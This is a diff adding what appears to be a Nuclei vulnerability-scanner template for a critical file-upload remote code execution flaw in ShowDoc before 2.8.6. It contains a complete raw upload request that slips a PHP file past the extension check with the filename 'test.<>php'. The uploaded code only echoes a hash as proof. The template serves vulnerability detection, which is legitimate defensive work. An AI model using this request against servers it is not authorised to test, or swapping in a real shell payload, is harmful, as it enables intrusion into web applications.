@@ -1,0 +1,42 @@
+http:
+- extractors:
+  - json:
+    - .url
+    type: json
+  matchers:
+  - condition: and
+    type: word
+    words:
+    - '"url":"http:'
+    - '"success":1'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /index.php?s=/home/page/uploadImg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+
+
+    ----------------------------835846770881083140190633
+
+    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+
+    Content-Type: text/plain
+
+
+    <?php echo md5(''rce_test'');?>
+
+    ----------------------------835846770881083140190633--
+
+    '
+id: showdoc-file-upload-rce
+info:
+  author: pikpikcu
+  name: Showdoc < 2.8.6 File Upload RCE
+  reference: https://github.com/star7th/showdoc/pull/1059
+  severity: critical
+  tags: rce,fileupload,showdoc
